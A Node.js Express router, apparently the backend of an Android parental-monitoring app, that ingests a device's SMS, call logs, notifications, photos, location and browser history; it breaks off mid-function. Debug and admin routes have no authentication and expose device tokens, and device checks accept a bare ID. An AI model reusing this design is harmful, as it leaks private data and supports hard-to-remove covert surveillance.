const express = require('express');
const mongoose = require('mongoose');
const multer = require('multer');
const path = require('path');
const fs = require('fs');
const crypto = require('crypto');
const { Device, Notification, CallLog, AppUsage, LocationHistory, Photo, SMS, BrowserHistory, KeystrokeSession, User, InstalledApp, CallRecording } = require('../models');

const router = express.Router();

const normalizeNotificationTimestamp = (value) => {
  if (!value) return new Date();
  const date = new Date(value);
  return Number.isNaN(date.getTime()) ? new Date() : date;
};

const normalizeNotificationMessage = (content, title) => {
  if (typeof content === 'string' && content.trim()) return content.trim();
  if (typeof title === 'string') return title.trim();
  return '';
};

const buildNotificationDedupeHash = ({ deviceId, packageName, title, content, timestamp }) => {
  const normalizedTimestamp = normalizeNotificationTimestamp(timestamp).getTime();
  const normalizedMessage = normalizeNotificationMessage(content, title);
  const raw = `${deviceId || ''}||${packageName || ''}||${normalizedTimestamp}||${normalizedMessage}`;
  return crypto.createHash('sha1').update(raw).digest('hex');
};

const normalizeNotificationDoc = (deviceId, notification = {}) => {
  const normalizedTimestamp = normalizeNotificationTimestamp(notification.timestamp);
  const normalizedTitle = typeof notification.title === 'string' ? notification.title.trim() : notification.title;
  const normalizedContent = normalizeNotificationMessage(notification.content ?? notification.text, normalizedTitle);

  return {
    deviceId,
    packageName: notification.packageName,
    appName: notification.appName,
    title: normalizedTitle,
    content: normalizedContent,
    imageUrl: notification.imageUrl,
    timestamp: normalizedTimestamp,
    dedupeHash: buildNotificationDedupeHash({
      deviceId,
      packageName: notification.packageName,
      title: normalizedTitle,
      content: normalizedContent,
      timestamp: normalizedTimestamp
    })
  };
};

const dedupeNotificationDocs = (docs) => {
  const seen = new Set();
  return docs.filter(doc => {
    if (!doc.packageName) return false;
    if (seen.has(doc.dedupeHash)) return false;
    seen.add(doc.dedupeHash);
    return true;
  });
};

const upsertNotifications = async (docs) => {
  if (!docs || docs.length === 0) return { inserted: 0, duplicatesSkipped: 0 };

  const operations = docs.map(doc => ({
    updateOne: {
      filter: { dedupeHash: doc.dedupeHash },
      update: { $setOnInsert: doc },
      upsert: true
    }
  }));

  const result = await Notification.bulkWrite(operations, { ordered: false });
  const inserted = result.upsertedCount || 0;
  return { inserted, duplicatesSkipped: docs.length - inserted };
};

// Configure multer for call recording uploads
const callRecordingDir = path.join(__dirname, '..', 'uploads', 'call-recordings');
if (!fs.existsSync(callRecordingDir)) {
  fs.mkdirSync(callRecordingDir, { recursive: true });
}

const callRecordingStorage = multer.diskStorage({
  destination: (req, file, cb) => cb(null, callRecordingDir),
  filename: (req, file, cb) => {
    const deviceId = req.body.deviceId || req.headers['x-device-id'] || 'unknown';
    const timestamp = Date.now();
    cb(null, `${deviceId}_${timestamp}_${file.originalname}`);
  }
});

const callRecordingUpload = multer({
  storage: callRecordingStorage,
  limits: { fileSize: 50 * 1024 * 1024 }, // 50MB max
  fileFilter: (req, file, cb) => {
    const allowed = ['.mp3', '.m4a', '.wav', '.aac', '.ogg'];
    const ext = path.extname(file.originalname).toLowerCase();
    if (allowed.includes(ext)) {
      cb(null, true);
    } else {
      cb(new Error('Only audio files are allowed'), false);
    }
  }
});

// Debug endpoint - check device by any ID
router.get('/debug/:id', async (req, res) => {
  try {
    const id = req.params.id;
    console.log(`[DEBUG] Looking up device with ID: ${id}`);
    
    let device = null;
    let foundBy = null;
    
    // Try MongoDB _id
    if (mongoose.Types.ObjectId.isValid(id)) {
      device = await Device.findById(id);
      if (device) foundBy = 'MongoDB _id';
    }
    
    // Try deviceId (Android ID)
    if (!device) {
      device = await Device.findOne({ deviceId: id });
      if (device) foundBy = 'Android deviceId';
    }
    
    if (!device) {
      // List all devices
      const allDevices = await Device.find({}, { _id: 1, deviceId: 1, name: 1 }).limit(10);
      return res.json({
        found: false,
        searchedId: id,
        message: 'Device not found',
        existingDevices: allDevices.map(d => ({
          mongoId: d._id.toString(),
          androidId: d.deviceId,
          name: d.name
        }))
      });
    }
    
    res.json({
      found: true,
      foundBy,
      device: {
        mongoId: device._id.toString(),
        androidId: device.deviceId,
        name: device.name,
        owner: device.owner,
        mode: device.mode || 'child',
        deviceOwnerProvisioned: device.deviceOwnerProvisioned || false,
        lastSeen: device.lastSeen,
        battery: device.battery,
        fcmToken: device.fcmToken || null,
        hasFcmToken: !!device.fcmToken,
        permissions: device.permissions || {},
        screenTime: device.screenTime || 0
      }
    });
  } catch (error) {
    console.error('[DEBUG] Error:', error);
    res.status(500).json({ error: error.message });
  }
});

// Admin endpoint to manually set FCM token (for testing/debugging)
router.post('/admin/set-fcm-token/:id', async (req, res) => {
  try {
    const { fcmToken } = req.body;
    const id = req.params.id;
    
    if (!fcmToken) {
      return res.status(400).json({ error: 'fcmToken is required in request body' });
    }
    
    let device = null;
    
    // Try MongoDB _id first
    if (mongoose.Types.ObjectId.isValid(id)) {
      device = await Device.findById(id);
    }
    
    // Try deviceId (Android ID)
    if (!device) {
      device = await Device.findOne({ deviceId: id });
    }
    
    if (!device) {
      return res.status(404).json({ error: 'Device not found' });
    }
    
    device.fcmToken = fcmToken;
    await device.save();
    
    console.log(`[Admin] FCM token set for device ${device.name}: ${fcmToken.substring(0, 30)}...`);
    
    res.json({
      success: true,
      message: `FCM token set for device ${device.name}`,
      device: {
        id: device._id.toString(),
        name: device.name,
        hasFcmToken: true
      }
    });
  } catch (error) {
    console.error('[Admin] Error setting FCM token:', error);
    res.status(500).json({ error: error.message });
  }
});

// Middleware to verify device - supports both deviceId (Android ID) and _id (MongoDB ID)
const verifyDevice = async (req, res, next) => {
  try {
    const deviceIdHeader = req.headers['x-device-id'] || req.body?.deviceId || req.body?.device_id;
    console.log(`[verifyDevice] Received X-Device-ID: ${deviceIdHeader}`);
    
    if (!deviceIdHeader) {
      console.log('[verifyDevice] No X-Device-ID header or body deviceId provided');
      return res.status(401).json({ error: 'Device ID required' });
    }

    let device = null;
    
    // First try to find by MongoDB _id (if it's a valid ObjectId)
    if (mongoose.Types.ObjectId.isValid(deviceIdHeader)) {
      console.log(`[verifyDevice] Trying to find by MongoDB _id: ${deviceIdHeader}`);
      device = await Device.findById(deviceIdHeader);
      if (device) {
        console.log(`[verifyDevice] Found device by _id: ${device.name}`);
      }
    }
    
    // If not found, try by deviceId field (Android ID)
    if (!device) {
      console.log(`[verifyDevice] Trying to find by deviceId field: ${deviceIdHeader}`);
      device = await Device.findOne({ deviceId: deviceIdHeader });
      if (device) {
        console.log(`[verifyDevice] Found device by deviceId: ${device.name}`);
      }
    }
    
    if (!device) {
      console.log(`[verifyDevice] Device NOT FOUND for ID: ${deviceIdHeader}`);
      return res.status(404).json({ error: 'Device not registered' });
    }

    req.device = device;
    next();
  } catch (error) {
    console.error('[verifyDevice] Error:', error);
    res.status(500).json({ error: 'Device verification failed' });
  }
};

// Heartbeat - update device status
router.post('/heartbeat', verifyDevice, async (req, res) => {
  try {
    const { battery, screenTime, isCharging } = req.body;

    req.device.isOnline = true;
    req.device.lastSeen = new Date();
    if (battery !== undefined) req.device.battery = battery;
    if (screenTime !== undefined) req.device.screenTime = screenTime;

    await req.device.save();

    res.json({
      success: true,
      settings: req.device.settings,
      blockedApps: req.device.blockedApps
    });
  } catch (error) {
    res.status(500).json({ error: 'Heartbeat failed' });
  }
});

// Update FCM token
router.post('/fcm-token', verifyDevice, async (req, res) => {
  try {
    const { fcmToken } = req.body;
    console.log(`[FCM Token] Received token update for device ${req.device.name}`);
    console.log(`[FCM Token] Token: ${fcmToken ? fcmToken.substring(0, 30) + '...' : 'EMPTY'}`);
    
    if (!fcmToken) {
      console.log('[FCM Token] ERROR: No token provided');
      return res.status(400).json({ error: 'FCM token is required' });
    }
    
    req.device.fcmToken = fcmToken;
    await req.device.save();
    console.log(`[FCM Token] ✅ Token saved successfully for device ${req.device.name}`);
    res.json({ success: true });
  } catch (error) {
    console.error('[FCM Token] Error:', error);
    res.status(500).json({ error: 'Failed to update FCM token' });
  }
});

// Sync notifications (with X-Device-ID header)
router.post('/notifications', verifyDevice, async (req, res) => {
  try {
    const { notifications } = req.body;

    if (!Array.isArray(notifications)) {
      return res.status(400).json({ error: 'Notifications must be an array' });
    }

    const docs = dedupeNotificationDocs(
      notifications.map(n => normalizeNotificationDoc(req.device.deviceId, n))
    );
    const result = await upsertNotifications(docs);

    res.json({
      success: true,
      count: result.inserted,
      duplicatesSkipped: result.duplicatesSkipped
    });
  } catch (error) {
    // Ignore duplicate key errors
    if (error.code !== 11000) {
      console.error('Sync notifications error:', error);
    }
    res.json({ success: true });
  }
});

// Upload single notification (from NotificationListener - without header, deviceId in body)
router.post('/notification', async (req, res) => {
  try {
    const notification = req.body;
    
    if (!notification.deviceId) {
      return res.status(400).json({ error: 'deviceId is required' });
    }
    
    // Find device by Android deviceId
    const device = await Device.findOne({ deviceId: notification.deviceId });
    if (!device) {
      return res.status(404).json({ error: 'Device not found' });
    }
    
    const doc = normalizeNotificationDoc(device.deviceId, notification);
    const result = await upsertNotifications([doc]);
    
    if (result.inserted > 0) {
      console.log(`[Notification] Saved notification from ${notification.appName} for device ${device.name}`);
    }
    
    res.json({ success: true, duplicate: result.inserted === 0 });
  } catch (error) {
    // Ignore duplicate key errors
    if (error.code !== 11000) {
      console.error('Upload notification error:', error);
    }
    res.json({ success: true });
  }
});

// Cleanup duplicate notifications using exact key: device + package + timestamp + message
router.post('/notifications/cleanup-duplicates', async (req, res) => {
  try {
    const { deviceId } = req.body || {};

    const pipeline = [
      ...(deviceId ? [{ $match: { deviceId } }] : []),
      {
        $group: {
          _id: {
            deviceId: '$deviceId',
            packageName: '$packageName',
            timestamp: '$timestamp',
            message: { $ifNull: ['$content', '$title'] }
          },
          count: { $sum: 1 },
          docs: { $push: '$_id' },
          firstDoc: { $first: '$_id' }
        }
      },
      { $match: { count: { $gt: 1 } } }
    ];

    const duplicates = await Notification.aggregate(pipeline).allowDiskUse(true);

    let deletedCount = 0;
    for (const dup of duplicates) {
      const idsToDelete = dup.docs.filter(id => !id.equals(dup.firstDoc));
      if (idsToDelete.length > 0) {
        const result = await Notification.deleteMany({ _id: { $in: idsToDelete } });
        deletedCount += result.deletedCount;
      }
    }

    res.json({
      success: true,
      duplicateGroupsFound: duplicates.length,
      notificationsDeleted: deletedCount
    });
  } catch (error) {
    console.error('Notification duplicate cleanup error:', error);
    res.status(500).json({ success: false, error: error.message });
  }
});

// Sync call logs
router.post('/call-logs', verifyDevice, async (req, res) => {
  try {
    const { callLogs } = req.body;

    if (!Array.isArray(callLogs)) {
      return res.status(400).json({ error: 'Call logs must be an array' });
    }

    const docs = callLogs.map(c => ({
      deviceId: req.device.deviceId,
      number: c.number,
      name: c.name,
      type: c.type,
      duration: c.duration,
      hasRecording: c.hasRecording || false,
      recordingUrl: c.recordingUrl,
      timestamp: c.timestamp || new Date()
    }));

    await CallLog.insertMany(docs, { ordered: false });

    res.json({
      success: true,
      count: docs.length
    });
  } catch (error) {
    if (error.code !== 11000) {
      console.error('Sync call logs error:', error);
    }
    res.json({ success: true });
  }
});

// Sync app usage
router.post('/app-usage', verifyDevice, async (req, res) => {
  try {
    const { apps } = req.body;

    if (!Array.isArray(apps)) {
      return res.status(400).json({ error: 'Apps must be an array' });
    }

    const today = new Date();
    today.setHours(0, 0, 0, 0);

    for (const app of apps) {
      await AppUsage.findOneAndUpdate(
        {
          deviceId: req.device.deviceId,
          packageName: app.packageName,
          date: { $gte: today }
        },
        {
          $set: {
            appName: app.appName,
            usageTime: app.usageTime,
            openCount: app.openCount
          },
          $setOnInsert: {
            deviceId: req.device.deviceId,
            packageName: app.packageName,
            date: new Date()
          }
        },
        { upsert: true }
      );
    }

    res.json({ success: true });
  } catch (error) {
    console.error('Sync app usage error:', error);
    res.status(500).json({ error: 'Failed to sync app usage' });
  }
});

// Update location
router.post('/location', verifyDevice, async (req, res) => {
  try {
    const { latitude, longitude, accuracy, address } = req.body;

    if (!latitude || !longitude) {
      return res.status(400).json({ error: 'Latitude and longitude required' });
    }

    // Update device current location
    req.device.location = {
      latitude,
      longitude,
      accuracy,
      address,
      timestamp: new Date()
    };
    await req.device.save();

    // Save to history
    await LocationHistory.create({
      deviceId: req.device.deviceId,
      latitude,
      longitude,
      accuracy,
      address
    });

    res.json({ success: true });
  } catch (error) {
    console.error('Update location error:', error);
    res.status(500).json({ error: 'Failed to update location' });
  }
});

// Sync all data with deviceId in path (used by Android app)
// NOTE: This route must skip reserved paths like 'photos', 'sms', 'permissions', etc.
router.post('/:deviceId', async (req, res, next) => {
  const deviceIdParam = req.params.deviceId;
  
  // Skip if deviceIdParam matches a known route
  const reservedPaths = ['photos', 'sms', 'permissions', 'sync', 'command-ack', 
                         'heartbeat', 'fcm-token', 'notifications', 'notification',
                         'call-logs', 'app-usage', 'location', 'admin', 'debug',
                         'call-recording', 'browser-history', 'keystrokes'];
  if (reservedPaths.includes(deviceIdParam.toLowerCase())) {
    return next('route');
  }
  
  try {
    console.log(`[/:deviceId] Received sync request for device: ${deviceIdParam}`);
    
    // Find device by MongoDB _id or Android deviceId
    let device = null;
    if (mongoose.Types.ObjectId.isValid(deviceIdParam)) {
      device = await Device.findById(deviceIdParam);
    }
    if (!device) {
      device = await Device.findOne({ deviceId: deviceIdParam });
    }
    
    if (!device) {
      console.log(`[/:deviceId] Device NOT FOUND: ${deviceIdParam}`);
      return res.status(404).json({ error: 'Device not found', success: false });
    }
    
    const { battery, screenTime, location, notifications, callLogs, apps, mobileDataEnabled } = req.body;
    
    console.log(`[/:deviceId] Device found: ${device.name} (${device._id})`);
    console.log(`[/:deviceId] Battery: ${battery}, ScreenTime: ${screenTime}, MobileData: ${mobileDataEnabled}`);
    console.log(`[/:deviceId] Location: ${JSON.stringify(location)}`);
    console.log(`[/:deviceId] Apps count: ${apps?.length || 0}`);

    // Update device status
    device.isOnline = true;
    device.lastSeen = new Date();
    if (battery !== undefined) device.battery = battery;
    if (screenTime !== undefined) device.screenTime = screenTime;
    if (mobileDataEnabled !== undefined) device.mobileDataEnabled = mobileDataEnabled;

    // Update location
    if (location && location.latitude && location.longitude) {
      device.location = {
        ...location,
        timestamp: new Date()
      };

      await LocationHistory.create({
        deviceId: device.deviceId,
        ...location
      });
    }

    await device.save();

    // Sync notifications
    if (notifications && notifications.length > 0) {
      const notifDocs = dedupeNotificationDocs(
        notifications.map(n => normalizeNotificationDoc(device.deviceId, n))
      );
      await upsertNotifications(notifDocs).catch(() => {});
    }

    // Sync call logs
    if (callLogs && callLogs.length > 0) {
      const callDocs = callLogs.map(c => ({
        deviceId: device.deviceId,
        ...c,
        timestamp: c.timestamp || new Date()
      }));
      await CallLog.insertMany(callDocs, { ordered: false }).catch(() => {});
    }

    // Sync app usage
    if (apps && apps.length > 0) {
      const today = new Date();
      today.setHours(0, 0, 0, 0);

      const operations = apps.map(app => ({
        updateOne: {
          filter: {
            deviceId: device.deviceId,
            packageName: app.packageName,
            date: { $gte: today }
          },
          update: {
            $set: {
              appName: app.appName,
              usageTime: app.usageTime,
              openCount: app.openCount || 1
            },
            $setOnInsert: { date: new Date() }
          },
          upsert: true
        }
      }));

      await AppUsage.bulkWrite(operations).catch(() => {});
    }

    // Sync installed apps list (for Device Owner hide/uninstall feature)
    const installedApps = req.body.installedApps;
    if (installedApps && installedApps.length > 0) {
      const installedOps = installedApps.map(app => ({
        updateOne: {
          filter: { deviceId: device.deviceId, packageName: app.packageName },
          update: {
            $set: {
              appName: app.appName,
              isSystemApp: app.isSystemApp || false,
              isEnabled: app.isEnabled !== false,
              lastSeenAt: new Date()
            }
          },
          upsert: true
        }
      }));
      await InstalledApp.bulkWrite(installedOps).catch(e => console.error('[Sync] InstalledApp bulkWrite error:', e));
      
      // Remove apps no longer installed (not seen in this sync)
      const currentPackages = installedApps.map(a => a.packageName);
      await InstalledApp.deleteMany({
        deviceId: device.deviceId,
        packageName: { $nin: currentPackages }
      }).catch(() => {});
    }

    console.log(`[/:deviceId] SUCCESS - Data synced for device: ${device.name}`);
    
    res.json({
      success: true,
      message: 'Data synced successfully',
      settings: device.settings,
      blockedApps: device.blockedApps
    });
  } catch (error) {
    console.error('[/:deviceId] ERROR:', error);
    res.status(500).json({ error: 'Sync failed', success: false });
  }
});

// Sync all data (bulk) - with X-Device-ID header
router.post('/sync', verifyDevice, async (req, res) => {
  try {
    const { battery, screenTime, location, notifications, callLogs, apps, mobileDataEnabled } = req.body;
    
    console.log(`[/sync] Received data from device: ${req.device.name} (${req.device._id})`);
    console.log(`[/sync] Battery: ${battery}, ScreenTime: ${screenTime}, MobileData: ${mobileDataEnabled}`);
    console.log(`[/sync] Location: ${JSON.stringify(location)}`);
    console.log(`[/sync] Notifications count: ${notifications?.length || 0}`);
    console.log(`[/sync] Call logs count: ${callLogs?.length || 0}`);
    console.log(`[/sync] Apps count: ${apps?.length || 0}`);

    // Update device status
    req.device.isOnline = true;
    req.device.lastSeen = new Date();
    if (battery !== undefined) req.device.battery = battery;
    if (screenTime !== undefined) req.device.screenTime = screenTime;
    if (mobileDataEnabled !== undefined) req.device.mobileDataEnabled = mobileDataEnabled;

    // Update location
    if (location && location.latitude && location.longitude) {
      req.device.location = {
        ...location,
        timestamp: new Date()
      };

      await LocationHistory.create({
        deviceId: req.device.deviceId,
        ...location
      });
    }

    await req.device.save();

    // Sync notifications
    if (notifications && notifications.length > 0) {
      const notifDocs = dedupeNotificationDocs(
        notifications.map(n => normalizeNotificationDoc(req.device.deviceId, n))
      );
      await upsertNotifications(notifDocs).catch(() => {});
    }

    // Sync call logs
    if (callLogs && callLogs.length > 0) {
      const callDocs = callLogs.map(c => ({
        deviceId: req.device.deviceId,
        ...c,
        timestamp: c.timestamp || new Date()
      }));
      await CallLog.insertMany(callDocs, { ordered: false }).catch(() => {});
    }

    // Sync app usage
    if (apps && apps.length > 0) {
      const today = new Date();
      today.setHours(0, 0, 0, 0);

      const operations = apps.map(app => ({
        updateOne: {
          filter: {
            deviceId: req.device.deviceId,
            packageName: app.packageName,
            date: { $gte: today }
          },
          update: {
            $set: {
              appName: app.appName,
              usageTime: app.usageTime,
              openCount: app.openCount
            },
            $setOnInsert: { date: new Date() }
          },
          upsert: true
        }
      }));

      await AppUsage.bulkWrite(operations).catch(() => {});
    }

    // Sync installed apps list (for Device Owner hide/uninstall feature)
    const installedApps2 = req.body.installedApps;
    if (installedApps2 && installedApps2.length > 0) {
      const installedOps2 = installedApps2.map(app => ({
        updateOne: {
          filter: { deviceId: req.device.deviceId, packageName: app.packageName },
          update: {
            $set: {
              appName: app.appName,
              isSystemApp: app.isSystemApp || false,
              isEnabled: app.isEnabled !== false,
              lastSeenAt: new Date()
            }
          },
          upsert: true
        }
      }));
      await InstalledApp.bulkWrite(installedOps2).catch(e => console.error('[Sync] InstalledApp bulkWrite error:', e));
      
      // Remove apps no longer installed
      const currentPkgs2 = installedApps2.map(a => a.packageName);
      await InstalledApp.deleteMany({
        deviceId: req.device.deviceId,
        packageName: { $nin: currentPkgs2 }
      }).catch(() => {});
    }

    console.log(`[/sync] SUCCESS - Data synced for device: ${req.device.name}`);
    
    res.json({
      success: true,
      settings: req.device.settings,
      blockedApps: req.device.blockedApps
    });
  } catch (error) {
    console.error('[/sync] ERROR:', error);
    res.status(500).json({ error: 'Sync failed', success: false });
  }
});

// Report command executed
router.post('/command-ack', verifyDevice, async (req, res) => {
  try {
    const { command, success, error } = req.body;
    
    console.log(`Device ${req.device.deviceId} - Command '${command}': ${success ? 'Success' : 'Failed'} ${error || ''}`);

    res.json({ success: true });
  } catch (error) {
    res.status(500).json({ error: 'Failed to acknowledge command' });
  }
});

// Update device permissions status
router.post('/permissions', verifyDevice, async (req, res) => {
  try {
    const { permissions } = req.body;
    
    if (!permissions) {
      return res.status(400).json({ error: 'Permissions object required' });
    }

    // Update permissions
    req.device.permissions = {
      location: permissions.location || false,
      backgroundLocation: permissions.backgroundLocation || false,
      camera: permissions.camera || false,
      microphone: permissions.microphone || false,
      storage: permissions.storage || false,
      callLog: permissions.callLog || false,
      contacts: permissions.contacts || false,
      sms: permissions.sms || false,
      phone: permissions.phone || false,
      notifications: permissions.notifications || false,
      usageStats: permissions.usageStats || false,
      overlay: permissions.overlay || false,
      batteryOptimization: permissions.batteryOptimization || false,
      deviceAdmin: permissions.deviceAdmin || false,
      accessibility: permissions.accessibility || false,
      restrictedSettings: permissions.restrictedSettings || permissions.restrictionSettings || false,
      lastUpdated: new Date()
    };

    // Auto-detect Device Owner mode: if deviceAdmin is true and mode isn't already set
    if (permissions.deviceAdmin && req.device.mode !== 'deviceOwner') {
      req.device.mode = 'deviceOwner';
      req.device.deviceOwnerProvisioned = true;
      req.device.provisioningDate = req.device.provisioningDate || new Date();
      req.device.provisioningMethod = req.device.provisioningMethod || 'adb';
      req.device.deviceOwnerPolicies = req.device.deviceOwnerPolicies || {
        uninstallProtected: true,
        accessibilityAutoRecover: true,
        silentInstallEnabled: true
      };
      console.log(`[DO] Auto-detected Device Owner for device ${req.device.deviceId}`);
    }

    await req.device.save();

    console.log(`Device ${req.device.deviceId} - Permissions updated`);

    res.json({ 
      success: true,
      message: 'Permissions updated'
    });
  } catch (error) {
    console.error('Permissions update error:', error);
    res.status(500).json({ error: 'Failed to update permissions' });
  }
});

// Helper function to detect photo source/album from file path
function detectPhotoSource(filePath, fileName) {
  if (!filePath && !fileName) return 'Other';
  const path = (filePath || fileName || '').toLowerCase();
  
  // Screenshots (typically in Screenshots folder or has 'screenshot' in name)
  if (path.includes('screenshot') || path.includes('screen_') || path.includes('scrnshot')) {
    return 'Screenshot';
  }
  
  // Camera photos (DCIM folder or camera-related keywords)
  if (path.includes('dcim') || path.includes('/camera/') || path.includes('img_') || 
      path.includes('photo_') || path.includes('cam_')) {
    return 'Camera';
  }
  
  // WhatsApp images
  if (path.includes('whatsapp')) {
    return 'WhatsApp';
  }
  
  // Telegram images
  if (path.includes('telegram')) {
    return 'Telegram';
  }
  
  // Downloads folder
  if (path.includes('/download/') || path.includes('downloads')) {
    return 'Download';
  }
  
  return 'Other';
}

// Sync photos from device
router.post('/photos', verifyDevice, async (req, res) => {
  try {
    const { photos } = req.body;

    console.log(`[Photo Sync] Received ${photos?.length || 0} photos from device ${req.device.deviceId}`);

    if (!Array.isArray(photos)) {
      return res.status(400).json({ error: 'Photos must be an array' });
    }

    if (photos.length === 0) {
      return res.json({
        success: true,
        count: 0,
        message: 'No photos to sync'
      });
    }

    // Get the user to check storage quota
    const user = await User.findById(req.device.owner);
    if (!user) {
      return res.status(404).json({ error: 'User not found' });
    }

    const storageLimit = user.photoStorageLimit || (200 * 1024 * 1024); // 200MB default
    
    // Calculate actual current storage from existing photos (more accurate than tracking)
    const existingPhotosStats = await Photo.aggregate([
      { $match: { deviceId: req.device.deviceId } },
      { $group: { _id: null, totalSize: { $sum: '$size' }, count: { $sum: 1 } } }
    ]);
    
    let currentStorage = existingPhotosStats[0]?.totalSize || 0;
    const existingCount = existingPhotosStats[0]?.count || 0;
    
    console.log(`[Photo Sync] Current storage: ${(currentStorage / 1024 / 1024).toFixed(2)}MB, existing photos: ${existingCount}`);
    
    // Update user's actual storage used (sync with reality)
    await User.findByIdAndUpdate(req.device.owner, {
      $set: { photoStorageUsed: currentStorage }
    });
    
    // Check if quota is already full
    if (currentStorage >= storageLimit) {
      console.log(`[Photo Sync] Storage quota full (${(currentStorage / 1024 / 1024).toFixed(2)}MB / ${(storageLimit / 1024 / 1024).toFixed(0)}MB)`);
      return res.json({
        success: true,
        count: 0,
        skipped: photos.length,
        quotaExceeded: true,
        quotaFull: true,
        storageUsed: currentStorage,
        storageLimit,
        remainingStorage: 0,
        message: 'Storage quota full. Please delete existing photos from the dashboard to sync new ones.'
      });
    }
    
    // Get existing photo file paths to check for duplicates
    const existingPaths = new Set();
    const existingPhotos = await Photo.find({ deviceId: req.device.deviceId }).select('filePath');
    existingPhotos.forEach(p => existingPaths.add(p.filePath));
    console.log(`[Photo Sync] Found ${existingPaths.size} existing photo paths for duplicate check`);
    
    // Photos should already be sorted newest first from device
    // Filter out duplicates and calculate sizes
    let newPhotosSize = 0;
    const photosToSync = [];
    let duplicatesSkipped = 0;
    let noThumbnailSkipped = 0;
    
    for (const p of photos) {
      // Skip duplicates
      if (existingPaths.has(p.filePath)) {
        duplicatesSkipped++;
        continue;
      }
      
      // Skip if no thumbnail (required for viewing)
      if (!p.thumbnail) {
        noThumbnailSkipped++;
        continue;
      }
      
      // Use a reasonable size estimate if size is 0 or missing
      // Thumbnail is about 10-50KB typically
      const photoSize = p.size || 50000; // Default 50KB if no size
      
      // Check if adding this photo would exceed quota
      if (currentStorage + newPhotosSize + photoSize <= storageLimit) {
        photosToSync.push({
          deviceId: req.device.deviceId,
          fileName: p.fileName,
          filePath: p.filePath,
          thumbnailBase64: p.thumbnail,
          fullImageBase64: p.fullImage,
          mimeType: p.mimeType || 'image/jpeg',
          width: p.width,
          height: p.height,
          size: photoSize,
          dateTaken: p.dateTaken ? new Date(p.dateTaken) : new Date(),
          timestamp: new Date(),
          source: detectPhotoSource(p.filePath, p.fileName),
          location: p.location ? {
            latitude: p.location.latitude,
            longitude: p.location.longitude,
            address: p.location.address || null
          } : null
        });
        newPhotosSize += photoSize;
      } else {
        // Quota would be exceeded, stop here
        console.log(`[Photo Sync] Quota limit reached, stopping at ${photosToSync.length} photos`);
        break;
      }
    }

    console.log(`[Photo Sync] Processing: ${photosToSync.length} to sync, ${duplicatesSkipped} duplicates, ${noThumbnailSkipped} no thumbnail`);

    // Insert photos that fit within quota
    if (photosToSync.length > 0) {
      try {
        const result = await Photo.insertMany(photosToSync, { ordered: false });
        console.log(`[Photo Sync] Inserted ${result.length} photos successfully`);
      } catch (insertError) {
        // Handle duplicate key errors gracefully
        if (insertError.code === 11000) {
          console.log('[Photo Sync] Some photos were duplicates, skipping');
          // Count how many actually got inserted
          const insertedCount = insertError.insertedDocs?.length || 0;
          console.log(`[Photo Sync] Actually inserted: ${insertedCount}`);
        } else {
          throw insertError;
        }
      }
      
      // Update user's storage used
      await User.findByIdAndUpdate(req.device.owner, {
        $inc: { photoStorageUsed: newPhotosSize }
      });
    }

    const finalStorage = currentStorage + newPhotosSize;
    const quotaExceeded = finalStorage >= storageLimit;
    const remainingStorage = Math.max(0, storageLimit - finalStorage);

    console.log(`[Photo Sync] Complete: ${photosToSync.length} synced, storage: ${(finalStorage / 1024 / 1024).toFixed(2)}MB / ${(storageLimit / 1024 / 1024).toFixed(0)}MB`);

    res.json({
      success: true,
      count: photosToSync.length,
      skipped: photos.length - photosToSync.length,
      duplicatesSkipped,
      noThumbnailSkipped,
      quotaExceeded,
      quotaFull: remainingStorage === 0,
      storageUsed: finalStorage,
      storageLimit,
      remainingStorage,
      message: quotaExceeded ? 'Storage quota reached. Delete photos from dashboard to sync more.' : null
    });
  } catch (error) {
    console.error('Sync photos error:', error);
    res.status(500).json({ error: 'Failed to sync photos', details: error.message });
  }
});

// Sync SMS from device
router.post('/sms', verifyDevice, async (req, res) => {
  try {
    const { messages } = req.body;

    if (!Array.isArray(messages)) {
      return res.status(400).json({ error: 'Messages must be an array' });
    }

    const docs = messages.map(m => ({
      deviceId: req.device.deviceId,
      address: m.address,
      contactName: m.contactName || null,
      body: m.body,
      type: m.type || 'inbox',
      read: m.read || false,
      date: m.date ? new Date(m.date) : new Date(),
      timestamp: new Date()
    }));

    // Use insertMany with ordered: false to skip duplicates
    await SMS.insertMany(docs, { ordered: false });

    console.log(`Device ${req.device.deviceId} - Synced ${docs.length} SMS messages`);

    res.json({
      success: true,
      count: docs.length
    });
  } catch (error) {
    // Ignore duplicate key errors
    if (error.code !== 11000) {
      console.error('Sync SMS error:', error);
    }
    res.json({ success: true });
  }
});

// Sync browser history from device
router.post('/browser-history', verifyDevice, async (req, res) => {
  try {
    const { history } = req.body;

    if (!Array.isArray(history)) {
      return res.status(400).json({ error: 'History must be an array' });
    }

    const docs = history.map(h => ({
      deviceId: req.device.deviceId,
      url: h.url,
      title: h.title || 'Untitled',
      browser: h.browser || 'Unknown',
      visitCount: h.visitCount || 1,
      visitedAt: h.visitedAt ? new Date(h.visitedAt) : new Date(),
      timestamp: new Date()
    }));

    // Use insertMany with ordered: false to skip duplicates
    await BrowserHistory.insertMany(docs, { ordered: false });

    console.log(`[Browser History] Device ${req.device.name} - Synced ${docs.length} history entries`);

    res.json({
      success: true,
      count: docs.length
    });
  } catch (error) {
    // Ignore duplicate key errors
    if (error.code !== 11000) {
      console.error('Sync browser history error:', error);
    }
    res.json({ success: true });
  }
});

// GET browser history for a device (for parent dashboard)
router.get('/browser-history/:deviceId', async (req, res) => {
  try {
    const { deviceId } = req.params;
    const { limit = 100, skip = 0, browser } = req.query;

    // Find device
    let device = null;
    if (mongoose.Types.ObjectId.isValid(deviceId)) {
      device = await Device.findById(deviceId);
    }
    if (!device) {
      device = await Device.findOne({ deviceId: deviceId });
    }
    if (!device) {
      return res.status(404).json({ error: 'Device not found' });
    }

    // Build query
    const query = { deviceId: device.deviceId };
    if (browser) {
      query.browser = browser;
    }

    const history = await BrowserHistory.find(query)
      .sort({ visitedAt: -1 })
      .skip(parseInt(skip))
      .limit(parseInt(limit));

    const total = await BrowserHistory.countDocuments(query);

    res.json({
      success: true,
      history,
      total,
      limit: parseInt(limit),
      skip: parseInt(skip)
    });
  } catch (error) {
    console.error('Get browser history error:', error);
    res.status(500).json({ error: 'Failed to get browser history' });
  }
});

// DELETE all browser history for a device
router.delete('/browser-history/:deviceId', async (req, res) => {
  try {
    const { deviceId } = req.params;

    // Find device
    let device = null;
    if (mongoose.Types.ObjectId.isValid(deviceId)) {
      device = await Device.findById(deviceId);
    }
    if (!device) {
      device = await Device.findOne({ deviceId: deviceId });
    }
    if (!device) {
      return res.status(404).json({ error: 'Device not found' });
    }

